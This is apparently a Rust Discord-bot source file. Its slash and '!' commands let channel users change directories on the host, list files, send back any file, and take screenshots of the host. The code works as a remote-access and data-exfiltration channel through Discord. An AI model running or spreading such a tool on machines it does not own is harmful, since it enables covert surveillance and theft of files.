#![allow(non_snake_case)]

mod commands;
mod dowithsys;

use dowithsys::make_screenshot;
use serde::Deserialize;
use serde_json;
use serenity::all::{CreateAttachment, CreateMessage, GuildId, Ready};
use serenity::async_trait;
use serenity::builder::{CreateInteractionResponse, CreateInteractionResponseMessage};
use serenity::model::application::Interaction;
use serenity::model::channel::Message;
use serenity::prelude::*;
use tokio::sync::Mutex;

use std::env::current_dir;
use std::str::FromStr;

#[allow(dead_code)]
#[derive(Deserialize)]
struct Config {
    TOKEN: String,
    GUIDID: String,
}

struct Handler {
    now_path: Mutex<String>,
}

#[async_trait]
impl EventHandler for Handler {
    async fn message(&self, ctx: Context, msg: Message) {
        if msg.content.chars().next().unwrap() == '!' {
            let _ = match rem_first(&msg.content) {
                "screenshot" => {
                    let ch = make_screenshot().await;
                    msg.channel_id
                        .send_message(&ctx.http, CreateMessage::new().add_file(ch))
                        .await
                }
                "pwd" => {
                    let path = &self.now_path.lock().await;
                    msg.channel_id.say(ctx.http, path.to_string()).await
                }

                _ => todo!(),
            };
        }
    }
    async fn interaction_create(&self, ctx: Context, interaction: Interaction) {
        let mut nowpath = self.now_path.lock().await;
        if let Interaction::Command(command) = interaction {
            let content = match command.data.name.as_str() {
                "cd" => Some(commands::cd::run(&command.data.options(), &mut *nowpath)),
                "ls" => Some(commands::ls::run(&mut *nowpath)),
                "sendfile" => Some(commands::sendfile::run(
                    &command.data.options(),
                    &mut *nowpath,
                )),
                "ping_bot" => Some(commands::ping::run()),
                "pwd" => Some(commands::pwd::run(&mut *nowpath)),
                "screenshot" => Some(commands::screenshot::run()),
                _ => Some("not implemented ".to_string()),
            };
            if let Some(content) = content {
                if command.data.name == "sendfile" {
                    if content == "not" {
                        let data =
                            CreateInteractionResponseMessage::new().content("Not valid command");
                        let builder = CreateInteractionResponse::Message(data);
                        if let Err(why) = command.create_response(&ctx.http, builder).await {
                            println!("Cannot respond to slash command: {why}");
                        }
                    } else {
                        let p = CreateAttachment::path(content).await.unwrap();
                        let data = CreateInteractionResponseMessage::new().add_file(p);
                        let builder = CreateInteractionResponse::Message(data);
                        if let Err(why) = command.create_response(&ctx.http, builder).await {
                            println!("Cannot respond to slash command: {why}");
                        }
                    }
                } else if command.data.name == "screenshot" {
                    let ch = make_screenshot().await;
                    let data = CreateInteractionResponseMessage::new().add_file(ch);
                    let builder = CreateInteractionResponse::Message(data);
                    if let Err(why) = command.create_response(&ctx.http, builder).await {
                        println!("Cannot respond to slash command: {why}");
                    }
                } else {
                    let data = CreateInteractionResponseMessage::new().content(content);
                    let builder = CreateInteractionResponse::Message(data);
                    if let Err(why) = command.create_response(&ctx.http, builder).await {
                        println!("Cannot respond to slash command: {why}");
                    }
                }
            }
        }
    }
    async fn ready(&self, ctx: Context, _ready: Ready) {
        let guild_id = GuildId::from_str(&config_reader().GUIDID).unwrap();

        let _commands = guild_id
            .set_commands(
                &ctx.http,
                vec![
                    commands::cd::register(),
                    commands::ls::register(),
                    commands::sendfile::register(),
                    commands::ping::register(),
                    commands::pwd::register(),
                    commands::screenshot::register(),
                ],
            )
            .await;
    }
}

#[tokio::main]
async fn main() {
    let token = config_reader().TOKEN;

    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::DIRECT_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT;

    let mut client = Client::builder(&token, intents)
        .event_handler(Handler {
            now_path: Mutex::new(current_dir().unwrap().to_str().unwrap().to_string()),
        })
        .await
        .unwrap();

    if let Err(why) = client.start().await {
        println!("Error client started: {why:?}");
    }
}

#[allow(dead_code)]
fn config_reader() -> Config {
    let res = include_str!("config.json");
    let des: Config = serde_json::from_str(res).unwrap();
    return des;
}

fn rem_first(value: &str) -> &str {
    let mut chars = value.chars();
    chars.next();
    chars.as_str()
}
